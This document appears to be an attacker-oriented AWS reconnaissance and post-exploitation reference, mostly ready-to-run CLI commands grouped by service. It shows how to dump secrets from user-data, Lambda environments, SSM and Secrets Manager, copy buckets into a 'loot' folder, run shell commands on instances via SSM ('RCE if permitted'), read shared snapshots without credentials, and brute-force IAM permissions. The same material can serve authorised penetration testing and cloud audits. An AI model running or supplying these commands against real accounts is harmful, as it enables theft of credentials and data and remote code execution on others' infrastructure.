# AWS service sweep — full per-service command reference

Conventions: add `--profile <p> --region <r> --output json` to every command.
The CLI auto-paginates JSON output. Loop regions from
`aws ec2 describe-regions --all-regions --query 'Regions[].RegionName' --output text`.
`--query` (JMESPath) trims output; raw JSON is better for archiving/parsing.

---

## STS / identity

```
aws sts get-caller-identity                      # Arn, Account, UserId
aws sts get-access-key-info --access-key-id AKIA...   # account owning ANY key; low-noise
aws sts assume-role --role-arn arn:aws:iam::198765432109:role/x --role-session-name s \
    [--external-id ID] [--duration-seconds 3600]
aws sts get-session-token                        # long-term key -> session creds
aws sts get-federation-token --name x            # sometimes allowed when assume-role isn't
```

Leaks: your blast radius; account IDs from stray keys without touching the victim account.

## IAM

```
aws iam get-account-authorization-details        # EVERYTHING in one call if allowed
aws iam list-users; aws iam list-roles; aws iam list-groups
aws iam list-attached-user-policies --user-name X ; aws iam list-user-policies --user-name X
aws iam list-attached-role-policies --role-name X ; aws iam list-role-policies --role-name X
aws iam get-policy --policy-arn A
aws iam get-policy-version --policy-arn A --version-id v1   # the actual document
aws iam get-role --role-name X                   # includes AssumeRolePolicyDocument
aws iam list-policies --scope Local              # customer-managed only
aws iam list-access-keys --user-name X ; aws iam get-login-profile --user-name X
aws iam list-mfa-devices --user-name X
aws iam simulate-principal-policy --policy-source-arn <arn> --action-names a:b c:d
aws iam list-open-id-connect-providers ; aws iam list-saml-providers
```

Leaks: full permission map; **trust documents** (`list-roles` includes
`AssumeRolePolicyDocument` URL-encoded JSON — decode and read every one yourself;
cross-account account IDs, `"AWS": "*"`, service trusts, OIDC subjects like GitHub
`repo:org/*` wildcards). Users without MFA but with console profiles.

## EC2

```
aws ec2 describe-instances
aws ec2 describe-instance-attribute --instance-id i-0abc --attribute userData \
    --query 'UserData.Value' --output text | base64 -d          # cred dump classic
aws ec2 describe-security-groups                 # hunt 0.0.0.0/0 and ::/0 ingress
aws ec2 describe-network-interfaces              # IP <-> resource mapping
aws ec2 describe-snapshots --owner-ids self
aws ec2 describe-snapshot-attribute --snapshot-id snap-0abc --attribute createVolumePermission
    # "Group":"all" = PUBLIC snapshot; foreign account IDs = shared
aws ec2 describe-images --owners self            # check "Public": true
aws ec2 describe-key-pairs ; aws ec2 describe-volumes ; aws ec2 describe-addresses
aws ec2 describe-vpcs ; aws ec2 describe-subnets ; aws ec2 describe-vpc-peering-connections
aws ec2 get-console-output --instance-id i-0abc  # boot logs; occasionally passwords
```

Leaks: public IPs; `IamInstanceProfile.Arn` per instance (IMDS theft target →
`metadata-ssrf-pivot`); user-data bootstrap secrets; public/shared snapshots and
AMIs (create a volume from a shared snapshot in YOUR account and mount it); VPC
peering = lateral network routes.

## S3

```
aws s3api list-buckets
aws s3api get-bucket-location --bucket B
aws s3api get-bucket-policy --bucket B ; aws s3api get-bucket-policy-status --bucket B
aws s3api get-public-access-block --bucket B ; aws s3api get-bucket-acl --bucket B
aws s3api get-bucket-versioning --bucket B       # versioned = deleted files recoverable
aws s3 ls s3://B --recursive ; aws s3 cp s3://B/key . ; aws s3 sync s3://B ./loot
```

Hand bucket names to `cloud-storage-exposure` for the public-access matrix.

## Lambda

```
aws lambda list-functions                        # includes Environment.Variables!
aws lambda get-function --function-name F        # Code.Location = PRESIGNED zip URL
curl -o F.zip "$(aws lambda get-function --function-name F --query 'Code.Location' --output text)"
aws lambda get-policy --function-name F          # resource policy; "*" = publicly invokable
aws lambda list-event-source-mappings ; aws lambda list-function-url-configs --function-name F
```

Leaks: env-var secrets; full source code; function URLs with `AuthType: NONE`.

## SecretsManager / SSM

```
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <arn>
aws secretsmanager get-resource-policy --secret-id <arn>
aws ssm describe-parameters
aws ssm get-parameters-by-path --path / --recursive --with-decryption   # dump ALL params
aws ssm get-parameter --name /prod/db/password --with-decryption
aws ssm describe-instance-information            # SSM-managed instances = shell targets
aws ssm send-command --instance-ids i-0abc --document-name AWS-RunShellScript \
    --parameters commands='id'                   # RCE if permitted
aws ssm start-session --target i-0abc            # interactive shell (session-manager-plugin)
```

## RDS / DynamoDB / Redshift

```
aws rds describe-db-instances                    # PubliclyAccessible, Endpoint.Address
aws rds describe-db-snapshots --include-public --snapshot-type public  # public snaps
aws rds describe-db-snapshot-attributes --db-snapshot-identifier S     # shared-to list
aws dynamodb list-tables ; aws dynamodb describe-table --table-name T
aws dynamodb scan --table-name T --max-items 50  # sample contents
aws redshift describe-clusters
```

Restore a shared RDS snapshot in your own account to read the data without creds.

## ECS / EKS / ECR

```
aws ecs list-clusters ; aws ecs list-services --cluster C ; aws ecs list-task-definitions
aws ecs describe-task-definition --task-definition TD   # containerDefinitions[].environment = secrets
aws eks list-clusters ; aws eks describe-cluster --name K   # endpointPublicAccess? OIDC issuer?
aws eks get-token --cluster-name K               # kubeconfig token if RBAC-mapped
aws ecr describe-repositories ; aws ecr list-images --repository-name R
aws ecr get-login-password | docker login --username AWS --password-stdin \
    123456789012.dkr.ecr.us-east-1.amazonaws.com
aws ecr batch-get-image --repository-name R --image-ids imageTag=latest   # manifest w/o docker
```

Pull images, extract layers, run `trufflehog filesystem` over them.

## CloudTrail / logging posture

```
aws cloudtrail describe-trails                   # empty list = NO LOGGING (finding + freedom)
aws cloudtrail get-trail-status --name T         # IsLogging true/false
aws cloudtrail get-event-selectors --trail-name T   # data events (S3/Lambda) usually OFF
aws cloudtrail lookup-events --max-results 50 --lookup-attributes \
    AttributeKey=EventName,AttributeValue=AssumeRole   # who assumes what (outbound trust map)
```

## Route53 / networking edge

```
aws route53 list-hosted-zones
aws route53 list-resource-record-sets --hosted-zone-id Z   # takeover candidates, internal names
aws elbv2 describe-load-balancers                # Scheme: internet-facing + DNSName
aws elbv2 describe-listeners --load-balancer-arn A ; aws elbv2 describe-target-groups
aws elb describe-load-balancers                  # classic ELB
aws cloudfront list-distributions                # DomainName + Origins (hidden origins!)
aws apigateway get-rest-apis ; aws apigateway get-stages --rest-api-id ID
aws apigatewayv2 get-apis                        # HTTP APIs; ApiEndpoint field
aws apigateway get-api-keys --include-values     # literal API keys if allowed
```

REST invoke URL: `https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/`.

## SNS / SQS

```
aws sns list-topics ; aws sns get-topic-attributes --topic-arn A   # Policy: "*" = public
aws sns list-subscriptions
aws sqs list-queues ; aws sqs get-queue-attributes --queue-url U --attribute-names All
aws sqs receive-message --queue-url U --max-number-of-messages 10  # read live messages
```

## KMS

```
aws kms list-keys ; aws kms list-aliases
aws kms get-key-policy --key-id K --policy-name default   # foreign principals? "*"?
aws kms describe-key --key-id K
```

A key policy trusting another account means ciphertext in this account is
decryptable from there (and vice versa).

## Other high-yield one-liners

```
aws organizations describe-organization ; aws organizations list-accounts   # the whole org
aws codebuild list-projects ; aws codebuild batch-get-projects --names P    # env secrets, buildspecs
aws cloudformation describe-stacks               # Parameters + Outputs = creds/endpoints
aws cloudformation get-template --stack-name S
aws elasticbeanstalk describe-environments
aws lightsail get-instances
aws amplify list-apps                            # env vars + repo URLs
aws ses list-identities                          # phishing-capable verified domains
aws efs describe-file-systems ; aws efs describe-mount-targets --file-system-id fs-0abc
```

---

## enumerate-iam (permission brute force)

```
python3 enumerate_iam.py --access-key AKIA... --secret-key ... \
    [--session-token ...] [--region us-east-1]
```

Output: live log of `-- <service>.<call>() worked!` lines. The project ships a
`generate_bruteforce_tests.py` to refresh its API-call database. Capture stdout to
a file and grep `worked`; every working call family maps to a sweep section above
— run those sections in full. Thousands of CloudTrail events; expect to be seen if
anyone is watching GuardDuty/CloudTrail.

## What scanners miss — read these yourself

1. Trust policies (`AssumeRolePolicyDocument`) — cross-account IDs, `"*"`,
   missing `sts:ExternalId` conditions, OIDC wildcard subjects.
2. Resource policies on S3/SNS/SQS/KMS/Lambda/ECR/SecretsManager — the second
   permission system; `"Principal": "*"` or foreign accounts here bypass IAM review.
3. Snapshot/AMI sharing attributes — explicit `createVolumePermission` /
   `launchPermission` grants.
4. User-data and console output — nobody rotates the creds baked in at launch.
5. Region tails — run the sweep in every region `describe-regions --all-regions`
   returns, including opt-in regions you must check for `OptInStatus`.

— vulture (silver-crown)
